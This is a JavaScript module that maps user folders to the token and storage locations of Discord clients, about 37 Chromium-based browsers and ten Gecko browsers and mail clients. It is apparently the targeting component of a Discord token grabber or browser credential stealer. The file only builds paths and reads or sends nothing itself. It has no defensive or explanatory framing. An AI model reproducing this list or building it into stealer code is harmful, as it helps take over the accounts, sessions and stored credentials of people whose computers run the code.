const getDiscordPaths = (user) => {
    return {
        'Discord Canary': `${user}\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb\\`,
        'Discord PTB':    `${user}\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb\\`,
        'Lightcord':      `${user}\\AppData\\Roaming\\Lightcord\\Local Storage\\leveldb\\`,
        'Discord':        `${user}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\`,
    }
};

const getChromiumBrowsers = (user) => {
    return {
        'Google(x86)':   `${user}\\AppData\\Local\\Google(x86)\\Chrome\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Google SxS':    `${user}\\AppData\\Local\\Google\\Chrome SxS\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Chromium':      `${user}\\AppData\\Local\\Chromium\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Thorium':       `${user}\\AppData\\Local\\Thorium\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Chrome':        `${user}\\AppData\\Local\\Google\\Chrome\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'MapleStudio':   `${user}\\AppData\\Local\\MapleStudio\\ChromePlus\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Iridium':       `${user}\\AppData\\Local\\Iridium\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        '7Star':         `${user}\\AppData\\Local\\7Star\\7Star\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'CentBrowser':   `${user}\\AppData\\Local\\CentBrowser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Chedot':        `${user}\\AppData\\Local\\Chedot\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Vivaldi':       `${user}\\AppData\\Local\\Vivaldi\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Kometa':        `${user}\\AppData\\Local\\Kometa\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Elements':      `${user}\\AppData\\Local\\Elements Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Epic':          `${user}\\AppData\\Local\\Epic Privacy Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'uCozMedia':     `${user}\\AppData\\Local\\uCozMedia\\Uran\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Fenrir':        `${user}\\AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Catalina':      `${user}\\AppData\\Local\\CatalinaGroup\\Citrio\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Coowon':        `${user}\\AppData\\Local\\Coowon\\Coowon\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Liebao':        `${user}\\AppData\\Local\\liebao\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'QIP Surf':      `${user}\\AppData\\Local\\QIP Surf\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Orbitum':       `${user}\\AppData\\Local\\Orbitum\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Comodo':        `${user}\\AppData\\Local\\Comodo\\Dragon\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        '360Browser':    `${user}\\AppData\\Local\\360Browser\\Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Maxthon3':      `${user}\\AppData\\Local\\Maxthon3\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'K-Melon':       `${user}\\AppData\\Local\\K-Melon\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'CocCoc':        `${user}\\AppData\\Local\\CocCoc\\Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Amigo':         `${user}\\AppData\\Local\\Amigo\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Torch':         `${user}\\AppData\\Local\\Torch\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Sputnik':       `${user}\\AppData\\Local\\Sputnik\\Sputnik\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Edge':          `${user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'DCBrowser':     `${user}\\AppData\\Local\\DCBrowser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Yandex':        `${user}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'UR Browser':    `${user}\\AppData\\Local\\UR Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Slimjet':       `${user}\\AppData\\Local\\Slimjet\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'BraveSoftware': `${user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Opera':         `${user}\\AppData\\Roaming\\Opera Software\\Opera Stable\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Opera GX':      `${user}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
    }
};

const getGeckoBrowsers = (user) => {
    return {
		'Cyberfox':    `${user}\\AppData\\Roaming\\8pecxstudios\\Cyberfox\\Profiles`,
		'BlackHaw':    `${user}\\AppData\\Roaming\\NETGATE Technologies\\BlackHaw\\Profiles`,
		'Waterfox':    `${user}\\AppData\\Roaming\\Waterfox\\Profiles`,
		'K-Meleon':    `${user}\\AppData\\Roaming\\K-Meleon\\Profiles`,
		'Thunderbird': `${user}\\AppData\\Roaming\\Thunderbird\\Profiles`,
		'IceDragon':   `${user}\\AppData\\Roaming\\Comodo\\IceDragon\\Profiles`,
		'Pale Moon':   `${user}\\AppData\\Roaming\\Moonchild Productions\\Pale Moon\\Profiles`,
		'Mercury':     `${user}\\AppData\\Roaming\\mercury\\Profiles`,
        'Firefox':     `${user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles`,
		'SeaMonkey':   `${user}\\AppData\\Roaming\\Mozilla\\SeaMonkey\\Profiles`,
    }
};

module.exports = {
    getDiscordPaths,
    getChromiumBrowsers,
    getGeckoBrowsers
}